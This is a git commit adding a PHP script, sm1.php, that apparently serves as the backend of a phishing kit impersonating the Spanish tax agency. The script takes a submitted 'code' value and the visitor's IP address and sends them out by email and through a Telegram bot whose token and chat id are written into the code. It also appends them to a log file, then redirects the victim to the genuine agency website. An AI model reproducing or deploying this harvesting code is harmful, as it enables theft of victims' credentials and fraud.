6450d2901b6f50beee89a0d1d1dde751d6de5190
lokassora <107511102+lokassora@users.noreply.github.com>
2022-06-15 03:16:10 +0200

    Initial commit

---
+++ sm1.php
@@ -0,0 +1,23 @@
+<?php
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$message .= "juuj     : ".$_POST['code']."\n";
+$message .= "|Client IP: ".$ip."\n";
+//$send = "XXXXXXXXXXXX@gmail.com";
+$subject = "From:  [ $ip ]";
+$headers = "From: [rf]<bin@fox.net>";
+
+{
+mail("$send", "$subject", $message);
+$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1097743075&text=" . urlencode($message)."" );
+
+}
+$f = fopen("../python/python.php", "a");
+	fwrite($f, $message);
+
+
+
+
+header("Location: https://sede.agenciatributaria.gob.es");
+?>
